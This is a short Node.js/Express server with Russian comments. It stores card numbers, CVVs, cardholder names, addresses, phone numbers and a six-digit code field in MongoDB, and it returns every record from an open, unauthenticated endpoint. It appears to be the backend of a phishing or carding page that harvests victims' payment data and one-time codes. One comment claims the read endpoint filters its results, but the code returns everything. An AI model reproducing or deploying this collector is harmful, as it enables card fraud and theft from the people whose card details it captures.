const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3002;
const MONGODB_URI = process.env.MONGODB_URI;

app.use(cors());
app.use(express.json());

mongoose.connect(MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => {
  console.log('Connected to MongoDB');
}).catch((error) => {
  console.error('Error connecting to MongoDB:', error.message);
});

// Обработчик для корневого маршрута
app.get('/', (req, res) => {
  res.send('Привет, сервер работает');
});

const userSchema = new mongoose.Schema({
  first_name: String,
  last_name: String,
  phone: String,
  city: String,
  street: String,
  date: String,
  card_num: String,
  card_cvv: String,
  customer_name: String,
  boolean_field: Boolean,
  amount: String,
  sixdigits: String,
  abobus_name: String,
  boolean_six: Boolean,
  validate_bill: Boolean,
});

const User = mongoose.model('User', userSchema);

// Обработчик для сохранения данных
app.post('/users', async (req, res) => {
  try {
    const newUser = new User(req.body);
    await newUser.save();
    console.log('Данные успешно сохранены:', newUser);
    res.status(200).send('Данные успешно сохранены');
  } catch (error) {
    console.error('Ошибка при сохранении данных:', error.message);
    res.status(500).send('Ошибка сервера');
  }
});

// Обработчик для получения данных с условиями boolean_field: true и customer_name: Founder
app.get('/getData', async (req, res) => {
  try {
    const users = await User.find();
    res.status(200).json(users);
  } catch (error) {
    console.error('Error fetching users:', error.message);
    res.status(500).send('Server error');
  }
});


app.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`);
});
